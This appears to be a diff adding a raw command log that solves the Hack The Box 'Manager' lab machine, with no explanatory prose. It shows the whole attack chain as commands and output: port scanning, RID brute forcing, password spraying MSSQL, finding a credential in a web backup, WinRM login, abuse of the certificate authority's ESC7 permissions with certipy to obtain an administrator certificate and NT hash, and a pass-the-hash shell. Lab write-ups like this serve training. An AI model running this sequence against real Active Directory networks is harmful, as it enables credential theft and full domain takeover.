@@ -1,0 +1,295 @@
+> nmap -p- -sV manager.htb
+	Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-06 16:00 CET
+	Nmap scan report for manager.htb (10.10.11.236)
+	Host is up (0.023s latency).
+	Not shown: 61957 filtered tcp ports (no-response)
+	PORT      STATE SERVICE       VERSION
+	53/tcp    open  domain        Simple DNS Plus
+	80/tcp    open  http          Microsoft IIS httpd 10.0
+	88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-06 22:01:51Z)
+	135/tcp   open  msrpc         Microsoft Windows RPC
+	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+	389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	445/tcp   open  microsoft-ds?
+	464/tcp   open  kpasswd5?
+	593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+	636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
+	3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+	9389/tcp  open  mc-nmf        .NET Message Framing
+	49667/tcp open  msrpc         Microsoft Windows RPC
+	49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+	49688/tcp open  msrpc         Microsoft Windows RPC
+	49689/tcp open  msrpc         Microsoft Windows RPC
+	49726/tcp open  msrpc         Microsoft Windows RPC
+	60371/tcp open  msrpc         Microsoft Windows RPC
+	61845/tcp open  msrpc         Microsoft Windows RPC
+	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 155.02 seconds
+
+> windows server http 80 + winrm 5984 + mssql 1433
+
+> crackmapexec smb manager.htb -u 'whatever' -p '' --rid-brute
+	SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+	SMB         manager.htb     445    DC01             [+] manager.htb\test: 
+	SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
+	...
+	SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
+	SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
+	SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
+	SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
+	SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
+	SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
+	SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)
+
+> crackmapexec mssql manager.htb -u users.txt -p users.txt
+	MSSQL       manager.htb     1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
+	...
+	MSSQL       manager.htb     1433   DC01             [+] manager.htb\operator:operator
+
+> impacket-mssqlclient manager.htb/operator:operator@manager.htb -windows-auth 
+	Impacket v0.11.0 - Copyright 2023 Fortra
+
+	[*] Encryption required, switching to TLS
+	[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+	[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+	[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+	[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+	[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+	[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+	[!] Press help for extra shell commands
+	SQL (MANAGER\Operator  guest@master)> help
+
+	    lcd {path}                 - changes the current local directory to {path}
+	    exit                       - terminates the server process (and this session)
+	    enable_xp_cmdshell         - you know what it means
+	    disable_xp_cmdshell        - you know what it means
+	    enum_db                    - enum databases
+	    enum_links                 - enum linked servers
+	    enum_impersonate           - check logins that can be impersonate
+	    enum_logins                - enum login users
+	    enum_users                 - enum current db users
+	    enum_owner                 - enum db owner
+	    exec_as_user {user}        - impersonate with execute as user
+	    exec_as_login {login}      - impersonate with execute as login
+	    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+	    xp_dirtree {path}          - executes xp_dirtree on the path
+	    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+	    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+	    ! {cmd}                    - executes a local shell cmd
+	    show_query                 - show query
+	    mask_query                 - mask query
+	    
+	SQL (MANAGER\Operator  guest@master)> xp_dirtree
+	subdirectory                depth   file   
+	-------------------------   -----   ----   
+	$Recycle.Bin                    1      0   
+	Documents and Settings          1      0   
+	inetpub                         1      0   
+	PerfLogs                        1      0   
+	Program Files                   1      0   
+	Program Files (x86)             1      0   
+	ProgramData                     1      0   
+	Recovery                        1      0   
+	SQL2019                         1      0   
+	System Volume Information       1      0   
+	Users                           1      0   
+	Windows                         1      0   
+
+	SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub', 1, 1
+	subdirectory   depth   file   
+	------------   -----   ----   
+	custerr            1      0   
+	history            1      0   
+	logs               1      0   
+	temp               1      0   
+	wwwroot            1      0   
+
+	SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1
+	subdirectory                      depth   file   
+	-------------------------------   -----   ----   
+	about.html                            1      1   
+	contact.html                          1      1   
+	css                                   1      0   
+	images                                1      0   
+	index.html                            1      1   
+	js                                    1      0   
+	service.html                          1      1   
+	web.config                            1      1   
+	website-backup-27-07-23-old.zip       1      1   
+
+	SQL (MANAGER\Operator  guest@master)> 
+
+> wget manager.htb/website-backup-27-07-23-old.zip; unzip website-backup-27-07-23-old.zip; grep -R 'password' .
+	...
+	./.old-conf.xml:         <password>R4v3nBe5tD3veloP3r!123</password>
+
+> cat .old-conf.xml 
+	<?xml version="1.0" encoding="UTF-8"?>
+	<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+	   <server>
+	      <host>dc01.manager.htb</host>
+	      <open-port enabled="true">389</open-port>
+	      <secure-port enabled="false">0</secure-port>
+	      <search-base>dc=manager,dc=htb</search-base>
+	      <server-type>microsoft</server-type>
+	      <access-user>
+		 <user>raven@manager.htb</user>
+		 <password>R4v3nBe5tD3veloP3r!123</password>
+	      </access-user>
+	      <uid-attribute>cn</uid-attribute>
+	   </server>
+	   <search type="full">
+	      <dir-list>
+		 <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
+	      </dir-list>
+	   </search>
+	</ldap-conf>
+
+> evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+	Evil-WinRM shell v3.5
+	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+						
+	Info: Establishing connection to remote endpoint
+	*Evil-WinRM* PS C:\Users\Raven\Documents> ls
+	*Evil-WinRM* PS C:\Users\Raven\Documents> cd ..
+	*Evil-WinRM* PS C:\Users\Raven> ls
+
+	    Directory: C:\Users\Raven
+
+	Mode                LastWriteTime         Length Name
+	----                -------------         ------ ----
+	d-r---        7/27/2023   8:24 AM                Desktop
+	d-r---        7/27/2023   8:23 AM                Documents
+	d-r---        9/15/2018  12:19 AM                Downloads
+	d-r---        9/15/2018  12:19 AM                Favorites
+	d-r---        9/15/2018  12:19 AM                Links
+	d-r---        9/15/2018  12:19 AM                Music
+	d-r---        9/15/2018  12:19 AM                Pictures
+	d-----        9/15/2018  12:19 AM                Saved Games
+	d-r---        9/15/2018  12:19 AM                Videos
+
+	*Evil-WinRM* PS C:\Users\Raven> cd Desktop
+	*Evil-WinRM* PS C:\Users\Raven\Desktop> ls
+
+	    Directory: C:\Users\Raven\Desktop
+
+	Mode                LastWriteTime         Length Name
+	----                -------------         ------ ----
+	-ar---        12/6/2023  11:18 AM             34 user.txt
+
+	*Evil-WinRM* PS C:\Users\Raven\Desktop> cat user.txt
+	db2baf8908700547285027791b9a8ddc
+
+> certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable -stdout 
+	Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+	[*] Finding certificate templates
+	[*] Found 33 certificate templates
+	[*] Finding certificate authorities
+	[*] Found 1 certificate authority
+	[*] Found 11 enabled certificate templates
+	[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
+	[*] Got CA configuration for 'manager-DC01-CA'
+	[*] Enumeration output:
+	Certificate Authorities
+	  0
+	    CA Name                             : manager-DC01-CA
+	    DNS Name                            : dc01.manager.htb
+	    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
+	    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
+	    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
+	    Certificate Validity End            : 2122-07-27 10:31:04+00:00
+	    Web Enrollment                      : Disabled
+	    User Specified SAN                  : Disabled
+	    Request Disposition                 : Issue
+	    Enforce Encryption for Requests     : Enabled
+	    Permissions
+	      Owner                             : MANAGER.HTB\Administrators
+	      Access Rights
+		Enroll                          : MANAGER.HTB\Operator
+						  MANAGER.HTB\Authenticated Users
+						  MANAGER.HTB\Raven
+		ManageCertificates              : MANAGER.HTB\Administrators
+						  MANAGER.HTB\Domain Admins
+						  MANAGER.HTB\Enterprise Admins
+		ManageCa                        : MANAGER.HTB\Administrators
+						  MANAGER.HTB\Domain Admins
+						  MANAGER.HTB\Enterprise Admins
+						  MANAGER.HTB\Raven
+	    [!] Vulnerabilities
+	      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
+	Certificate Templates                   : [!] Could not find any certificate templates
+
+> certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+	Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+	[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+
+> certipy ca -ca 'manager-DC01-CA' -enable-template SubCa -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+	Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+	[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+
+> certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb 
+	Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+	[*] Requesting certificate via RPC
+	[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+	[*] Request ID is 13
+	Would you like to save the private key? (y/N) y
+	[*] Saved private key to 13.key
+	[-] Failed to request certificate
+
+> certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+	Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+	[*] Successfully issued certificate
+
+> certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 13
+	Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+	[*] Rerieving certificate with ID 13
+	[*] Successfully retrieved certificate
+	[*] Got certificate with UPN 'administrator@manager.htb'
+	[*] Certificate has no object SID
+	[*] Loaded private key from '13.key'
+	[*] Saved certificate and private key to 'administrator.pfx'
+
+> sudo ntpdate -u manager.htb
+	2023-12-07 01:10:33.664524 (+0100) +0.002999 +/- 0.014991 manager.htb 10.10.11.236 s1 no-leap
+
+> certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
+	Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+	[*] Using principal: administrator@manager.htb
+	[*] Trying to get TGT...
+	[*] Got TGT
+	[*] Saved credential cache to 'administrator.ccache'
+	[*] Trying to retrieve NT hash for 'administrator'
+	[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+
+> evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
+	Evil-WinRM shell v3.5
+						
+	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+						
+	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+						
+	Info: Establishing connection to remote endpoint
+	*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+	*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+	    Directory: C:\Users\Administrator\Desktop
+
+	Mode                LastWriteTime         Length Name
+	----                -------------         ------ ----
+	-ar---        12/6/2023   3:58 PM             34 root.txt
+
+	*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+		4e52584a073d038f90ff01e6be24babd
